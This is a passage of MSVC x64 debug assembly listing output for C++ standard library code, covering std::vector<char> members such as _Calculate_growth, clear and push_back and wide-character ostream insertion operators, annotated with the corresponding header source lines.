	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 16
	mov	QWORD PTR _Myend$[rsp], rax

; 1882 : 
; 1883 :         _My_data._Orphan_all();

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 1884 : 
; 1885 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rax, QWORD PTR _Myfirst$[rsp]
	cmp	QWORD PTR [rax], 0
	je	SHORT $LN2@Change_arr

; 1886 :             _Destroy_range(_Myfirst, _Mylast, _Al);

	mov	r8, QWORD PTR _Al$[rsp]
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Destroy_range@V?$allocator@D@std@@@std@@YAXPEADQEADAEAV?$allocator@D@0@@Z ; std::_Destroy_range<std::allocator<char> >

; 1887 :             _ASAN_VECTOR_REMOVE;
; 1888 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rax, QWORD PTR _Myend$[rsp]
	mov	rcx, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	rax, QWORD PTR [rax]
	sub	rax, rcx
	mov	r8, rax
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?deallocate@?$allocator@D@std@@QEAAXQEAD_K@Z ; std::allocator<char>::deallocate
$LN2@Change_arr:

; 1889 :         }
; 1890 : 
; 1891 :         _Myfirst = _Newvec;

	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR _Newvec$[rsp]
	mov	QWORD PTR [rax], rcx

; 1892 :         _Mylast  = _Newvec + _Newsize;

	mov	rax, QWORD PTR _Newsize$[rsp]
	mov	rcx, QWORD PTR _Newvec$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR _Mylast$[rsp]
	mov	QWORD PTR [rcx], rax

; 1893 :         _Myend   = _Newvec + _Newcapacity;

	mov	rax, QWORD PTR _Newcapacity$[rsp]
	mov	rcx, QWORD PTR _Newvec$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR _Myend$[rsp]
	mov	QWORD PTR [rcx], rax

; 1894 :         _ASAN_VECTOR_CREATE;
; 1895 :     }

	add	rsp, 88					; 00000058H
	ret	0
?_Change_array@?$vector@DV?$allocator@D@std@@@std@@AEAAXQEAD_K1@Z ENDP ; std::vector<char,std::allocator<char> >::_Change_array
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Calculate_growth@?$vector@DV?$allocator@D@std@@@std@@AEBA_K_K@Z
_TEXT	SEGMENT
_Oldcapacity$ = 32
_Max$ = 40
_Geometric$ = 48
this$ = 80
_Newsize$ = 88
?_Calculate_growth@?$vector@DV?$allocator@D@std@@@std@@AEBA_K_K@Z PROC ; std::vector<char,std::allocator<char> >::_Calculate_growth, COMDAT

; 1823 :     _CONSTEXPR20 size_type _Calculate_growth(const size_type _Newsize) const {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 1824 :         // given _Oldcapacity and _Newsize, calculate geometric growth
; 1825 :         const size_type _Oldcapacity = capacity();

	mov	rcx, QWORD PTR this$[rsp]
	call	?capacity@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ ; std::vector<char,std::allocator<char> >::capacity
	mov	QWORD PTR _Oldcapacity$[rsp], rax

; 1826 :         const auto _Max              = max_size();

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ ; std::vector<char,std::allocator<char> >::max_size
	mov	QWORD PTR _Max$[rsp], rax

; 1827 : 
; 1828 :         if (_Oldcapacity > _Max - _Oldcapacity / 2) {

	xor	edx, edx
	mov	rax, QWORD PTR _Oldcapacity$[rsp]
	mov	ecx, 2
	div	rcx
	mov	rcx, QWORD PTR _Max$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	cmp	QWORD PTR _Oldcapacity$[rsp], rax
	jbe	SHORT $LN2@Calculate_

; 1829 :             return _Max; // geometric growth would overflow

	mov	rax, QWORD PTR _Max$[rsp]
	jmp	SHORT $LN1@Calculate_
$LN2@Calculate_:

; 1830 :         }
; 1831 : 
; 1832 :         const size_type _Geometric = _Oldcapacity + _Oldcapacity / 2;

	xor	edx, edx
	mov	rax, QWORD PTR _Oldcapacity$[rsp]
	mov	ecx, 2
	div	rcx
	mov	rcx, QWORD PTR _Oldcapacity$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Geometric$[rsp], rax

; 1833 : 
; 1834 :         if (_Geometric < _Newsize) {

	mov	rax, QWORD PTR _Newsize$[rsp]
	cmp	QWORD PTR _Geometric$[rsp], rax
	jae	SHORT $LN3@Calculate_

; 1835 :             return _Newsize; // geometric growth would be insufficient

	mov	rax, QWORD PTR _Newsize$[rsp]
	jmp	SHORT $LN1@Calculate_
$LN3@Calculate_:

; 1836 :         }
; 1837 : 
; 1838 :         return _Geometric; // geometric growth is sufficient

	mov	rax, QWORD PTR _Geometric$[rsp]
$LN1@Calculate_:

; 1839 :     }

	add	rsp, 72					; 00000048H
	ret	0
?_Calculate_growth@?$vector@DV?$allocator@D@std@@@std@@AEBA_K_K@Z ENDP ; std::vector<char,std::allocator<char> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??A?$vector@DV?$allocator@D@std@@@std@@QEAAAEAD_K@Z
_TEXT	SEGMENT
_My_data$ = 0
this$ = 32
_Pos$ = 40
??A?$vector@DV?$allocator@D@std@@@std@@QEAAAEAD_K@Z PROC ; std::vector<char,std::allocator<char> >::operator[], COMDAT

; 1744 :     _NODISCARD _CONSTEXPR20 _Ty& operator[](const size_type _Pos) noexcept /* strengthened */ {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 1745 :         auto& _My_data = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 1746 : #if _CONTAINER_DEBUG_LEVEL > 0
; 1747 :         _STL_VERIFY(
; 1748 :             _Pos < static_cast<size_type>(_My_data._Mylast - _My_data._Myfirst), "vector subscript out of range");
; 1749 : #endif // _CONTAINER_DEBUG_LEVEL > 0
; 1750 : 
; 1751 :         return _My_data._Myfirst[_Pos];

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax]
	add	rax, QWORD PTR _Pos$[rsp]

; 1752 :     }

	add	rsp, 24
	ret	0
??A?$vector@DV?$allocator@D@std@@@std@@QEAAAEAD_K@Z ENDP ; std::vector<char,std::allocator<char> >::operator[]
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?capacity@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ
_TEXT	SEGMENT
_My_data$ = 0
this$ = 32
?capacity@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ PROC ; std::vector<char,std::allocator<char> >::capacity, COMDAT

; 1739 :     _NODISCARD _CONSTEXPR20 size_type capacity() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 1740 :         auto& _My_data = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 1741 :         return static_cast<size_type>(_My_data._Myend - _My_data._Myfirst);

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	rax, QWORD PTR [rax+16]
	sub	rax, rcx

; 1742 :     }

	add	rsp, 24
	ret	0
?capacity@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ ENDP ; std::vector<char,std::allocator<char> >::capacity
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?max_size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ
_TEXT	SEGMENT
$T1 = 32
$T2 = 40
this$ = 64
?max_size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ PROC ; std::vector<char,std::allocator<char> >::max_size, COMDAT

; 1734 :     _NODISCARD _CONSTEXPR20 size_type max_size() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 1735 :         return (_STD min)(

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEBAAEBV?$allocator@D@2@XZ ; std::vector<char,std::allocator<char> >::_Getal
	mov	rcx, rax
	call	?max_size@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA_KAEBV?$allocator@D@2@@Z ; std::_Default_allocator_traits<std::allocator<char> >::max_size
	mov	QWORD PTR $T1[rsp], rax
	call	?max@?$numeric_limits@_J@std@@SA_JXZ	; std::numeric_limits<__int64>::max
	mov	QWORD PTR $T2[rsp], rax
	lea	rdx, QWORD PTR $T1[rsp]
	lea	rcx, QWORD PTR $T2[rsp]
	call	??$min@_K@std@@YAAEB_KAEB_K0@Z		; std::min<unsigned __int64>
	mov	rax, QWORD PTR [rax]

; 1736 :             static_cast<size_type>((numeric_limits<difference_type>::max)()), _Alty_traits::max_size(_Getal()));
; 1737 :     }

	add	rsp, 56					; 00000038H
	ret	0
?max_size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ ENDP ; std::vector<char,std::allocator<char> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ
_TEXT	SEGMENT
_My_data$ = 0
this$ = 32
?size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ PROC	; std::vector<char,std::allocator<char> >::size, COMDAT

; 1729 :     _NODISCARD _CONSTEXPR20 size_type size() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 1730 :         auto& _My_data = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 1731 :         return static_cast<size_type>(_My_data._Mylast - _My_data._Myfirst);

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	rax, QWORD PTR [rax+8]
	sub	rax, rcx

; 1732 :     }

	add	rsp, 24
	ret	0
?size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ ENDP	; std::vector<char,std::allocator<char> >::size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?clear@?$vector@DV?$allocator@D@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
_My_data$ = 32
_Mylast$ = 40
_Myfirst$ = 48
this$ = 80
?clear@?$vector@DV?$allocator@D@std@@@std@@QEAAXXZ PROC	; std::vector<char,std::allocator<char> >::clear, COMDAT

; 1623 :     _CONSTEXPR20 void clear() noexcept { // erase all

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 1624 :         auto& _My_data    = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 1625 :         pointer& _Myfirst = _My_data._Myfirst;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR _Myfirst$[rsp], rax

; 1626 :         pointer& _Mylast  = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 1627 : 
; 1628 :         if (_Myfirst == _Mylast) { // already empty, nothing to do

	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR _Mylast$[rsp]
	mov	rcx, QWORD PTR [rcx]
	cmp	QWORD PTR [rax], rcx
	jne	SHORT $LN2@clear

; 1629 :             // This is an optimization for debug mode: we can avoid taking the debug lock to invalidate iterators.
; 1630 :             // Note that when clearing an empty vector, this will preserve past-the-end iterators, which is allowed by
; 1631 :             // N4901 [tab:container.seq.req] "a.clear() [...] may invalidate the past-the-end iterator".
; 1632 :             return;

	jmp	SHORT $LN1@clear
$LN2@clear:

; 1633 :         }
; 1634 : 
; 1635 :         _My_data._Orphan_all();

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 1636 :         _Destroy_range(_Myfirst, _Mylast, _Getal());

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::vector<char,std::allocator<char> >::_Getal
	mov	r8, rax
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Destroy_range@V?$allocator@D@std@@@std@@YAXPEADQEADAEAV?$allocator@D@0@@Z ; std::_Destroy_range<std::allocator<char> >

; 1637 :         _ASAN_VECTOR_MODIFY(static_cast<difference_type>(_Myfirst - _Mylast)); // negative when destroying elements
; 1638 :         _Mylast = _Myfirst;

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rcx, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	QWORD PTR [rax], rcx
$LN1@clear:

; 1639 :     }

	add	rsp, 72					; 00000048H
	ret	0
?clear@?$vector@DV?$allocator@D@std@@@std@@QEAAXXZ ENDP	; std::vector<char,std::allocator<char> >::clear
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?push_back@?$vector@DV?$allocator@D@std@@@std@@QEAAXAEBD@Z
_TEXT	SEGMENT
this$ = 48
_Val$ = 56
?push_back@?$vector@DV?$allocator@D@std@@@std@@QEAAXAEBD@Z PROC ; std::vector<char,std::allocator<char> >::push_back, COMDAT

; 912  :     _CONSTEXPR20 void push_back(const _Ty& _Val) { // insert element at end, provide strong guarantee

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 913  :         emplace_back(_Val);

	mov	rdx, QWORD PTR _Val$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??$emplace_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@QEAA?A_TAEBD@Z ; std::vector<char,std::allocator<char> >::emplace_back<char const &>

; 914  :     }

	add	rsp, 40					; 00000028H
	ret	0
?push_back@?$vector@DV?$allocator@D@std@@@std@@QEAAXAEBD@Z ENDP ; std::vector<char,std::allocator<char> >::push_back
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??1?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ PROC	; std::vector<char,std::allocator<char> >::~vector<char,std::allocator<char> >, COMDAT

; 806  :     _CONSTEXPR20 ~vector() noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 807  :         _Tidy();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Tidy@?$vector@DV?$allocator@D@std@@@std@@AEAAXXZ ; std::vector<char,std::allocator<char> >::_Tidy

; 808  : #if _ITERATOR_DEBUG_LEVEL != 0
; 809  :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Getal());
; 810  :         _Delete_plain_internal(_Alproxy, _STD exchange(_Mypair._Myval2._Myproxy, nullptr));
; 811  : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 812  :     }

	add	rsp, 40					; 00000028H
	ret	0
??1?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ ENDP	; std::vector<char,std::allocator<char> >::~vector<char,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??0?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
$T1 = 32
this$ = 64
??0?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ PROC	; std::vector<char,std::allocator<char> >::vector<char,std::allocator<char> >, COMDAT

; 675  :     _CONSTEXPR20 vector() noexcept(is_nothrow_default_constructible_v<_Alty>) : _Mypair(_Zero_then_variadic_args_t{}) {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rax, QWORD PTR this$[rsp]
	movzx	edx, BYTE PTR $T1[rsp]
	mov	rcx, rax
	call	??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1><>

; 676  :         _Mypair._Myval2._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

	mov	rax, QWORD PTR this$[rsp]
	lea	rdx, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
	mov	rcx, rax
	call	?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 677  :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ ENDP	; std::vector<char,std::allocator<char> >::vector<char,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??$?6_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@AEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@@Z
_TEXT	SEGMENT
tv66 = 32
_Ostr$ = 64
_Str$ = 72
??$?6_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@AEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@@Z PROC ; std::operator<<<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 5255 :     basic_ostream<_Elem, _Traits>& _Ostr, const basic_string<_Elem, _Traits, _Alloc>& _Str) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 5256 :     return _Insert_string(_Ostr, _Str.data(), _Str.size());

	mov	rcx, QWORD PTR _Str$[rsp]
	call	?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
	mov	QWORD PTR tv66[rsp], rax
	mov	rcx, QWORD PTR _Str$[rsp]
	call	?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data
	mov	rcx, QWORD PTR tv66[rsp]
	mov	r8, rcx
	mov	rdx, rax
	mov	rcx, QWORD PTR _Ostr$[rsp]
	call	??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z ; std::_Insert_string<wchar_t,std::char_traits<wchar_t>,unsigned __int64>

; 5257 : }

	add	rsp, 56					; 00000038H
	ret	0
??$?6_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@AEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@@Z ENDP ; std::operator<<<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z
_TEXT	SEGMENT
_State$ = 32
tv325 = 36
tv327 = 38
$T1 = 40
$T2 = 42
tv328 = 44
tv330 = 46
$T3 = 48
$T4 = 50
tv331 = 52
tv333 = 54
$T5 = 56
$T6 = 58
_Pad$ = 64
_Count$ = 72
tv324 = 80
tv137 = 88
tv139 = 96
tv320 = 104
tv323 = 112
tv326 = 120
_Ctype_fac$7 = 128
tv329 = 136
tv332 = 144
$T8 = 152
_Ok$ = 160
$T9 = 176
_Ostr$ = 208
_Val$ = 216
??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z PROC ; std::operator<<<wchar_t,std::char_traits<wchar_t> >, COMDAT

; 681  : basic_ostream<_Elem, _Traits>& operator<<(basic_ostream<_Elem, _Traits>& _Ostr, const char* _Val) { // insert NTBS

$LN29:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 200				; 000000c8H

; 682  :     ios_base::iostate _State = ios_base::goodbit;

	mov	DWORD PTR _State$[rsp], 0

; 683  :     streamsize _Count        = static_cast<streamsize>(_CSTD strlen(_Val));

	mov	rcx, QWORD PTR _Val$[rsp]
	call	strlen
	mov	QWORD PTR _Count$[rsp], rax

; 684  :     streamsize _Pad          = _Ostr.width() <= 0 || _Ostr.width() <= _Count ? 0 : _Ostr.width() - _Count;

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	test	rax, rax
	jle	SHORT $LN20@operator
	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	cmp	rax, QWORD PTR _Count$[rsp]
	jle	SHORT $LN20@operator
	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	sub	rax, QWORD PTR _Count$[rsp]
	mov	QWORD PTR tv137[rsp], rax
	jmp	SHORT $LN21@operator
$LN20@operator:
	mov	QWORD PTR tv137[rsp], 0
$LN21@operator:
	mov	rax, QWORD PTR tv137[rsp]
	mov	QWORD PTR _Pad$[rsp], rax

; 685  :     const typename basic_ostream<_Elem, _Traits>::sentry _Ok(_Ostr);

	mov	rdx, QWORD PTR _Ostr$[rsp]
	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::sentry
	npad	1

; 686  : 
; 687  :     if (!_Ok) {

	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??Bsentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEBA_NXZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::operator bool
	movzx	eax, al
	test	eax, eax
	jne	SHORT $LN11@operator

; 688  :         _State |= ios_base::badbit;

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax

; 689  :     } else { // state okay, insert characters

	jmp	$LN12@operator
$LN11@operator:

; 690  :         _TRY_IO_BEGIN
; 691  :         const ctype<_Elem>& _Ctype_fac = _STD use_facet<ctype<_Elem>>(_Ostr.getloc());

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	lea	rdx, QWORD PTR $T9[rsp]
	mov	rcx, rax
	call	?getloc@ios_base@std@@QEBA?AVlocale@2@XZ ; std::ios_base::getloc
	mov	QWORD PTR tv139[rsp], rax
	mov	rax, QWORD PTR tv139[rsp]
	mov	QWORD PTR tv320[rsp], rax
	mov	rcx, QWORD PTR tv320[rsp]
	call	??$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z ; std::use_facet<std::ctype<wchar_t> >
	mov	QWORD PTR tv323[rsp], rax
	mov	rax, QWORD PTR tv323[rsp]
	mov	QWORD PTR _Ctype_fac$7[rsp], rax
	lea	rcx, QWORD PTR $T9[rsp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale

; 692  :         if ((_Ostr.flags() & ios_base::adjustfield) != ios_base::left) {

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	mov	DWORD PTR tv324[rsp], eax
	mov	eax, DWORD PTR tv324[rsp]
	and	eax, 448				; 000001c0H
	cmp	eax, 64					; 00000040H
	je	$LN14@operator

; 693  :             for (; 0 < _Pad; --_Pad) { // pad on left

	jmp	SHORT $LN4@operator
$LN2@operator:
	mov	rax, QWORD PTR _Pad$[rsp]
	dec	rax
	mov	QWORD PTR _Pad$[rsp], rax
$LN4@operator:
	cmp	QWORD PTR _Pad$[rsp], 0
	jle	$LN14@operator

; 694  :                 if (_Traits::eq_int_type(_Traits::eof(), _Ostr.rdbuf()->sputc(_Ostr.fill()))) {

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?fill@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBA_WXZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::fill
	mov	WORD PTR tv325[rsp], ax
	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_streambuf@_WU?$char_traits@_W@std@@@2@XZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::rdbuf
	mov	QWORD PTR tv326[rsp], rax
	movzx	edx, WORD PTR tv325[rsp]
	mov	rcx, QWORD PTR tv326[rsp]
	call	?sputc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAG_W@Z ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::sputc
	mov	WORD PTR tv327[rsp], ax
	movzx	eax, WORD PTR tv327[rsp]
	mov	WORD PTR $T1[rsp], ax
	call	?eof@?$_WChar_traits@_W@std@@SAGXZ	; std::_WChar_traits<wchar_t>::eof
	mov	WORD PTR $T2[rsp], ax
	lea	rdx, QWORD PTR $T1[rsp]
	lea	rcx, QWORD PTR $T2[rsp]
	call	?eq_int_type@?$_WChar_traits@_W@std@@SA_NAEBG0@Z ; std::_WChar_traits<wchar_t>::eq_int_type
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN15@operator

; 695  :                     _State |= ios_base::badbit; // insertion failed, quit

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax

; 696  :                     break;

	jmp	SHORT $LN14@operator
$LN15@operator:

; 697  :                 }
; 698  :             }

	jmp	$LN2@operator
$LN14@operator:

; 699  :         }
; 700  : 
; 701  :         for (; _State == ios_base::goodbit && 0 < _Count; --_Count, ++_Val) {

	jmp	SHORT $LN7@operator
$LN5@operator:
	mov	rax, QWORD PTR _Count$[rsp]
	dec	rax
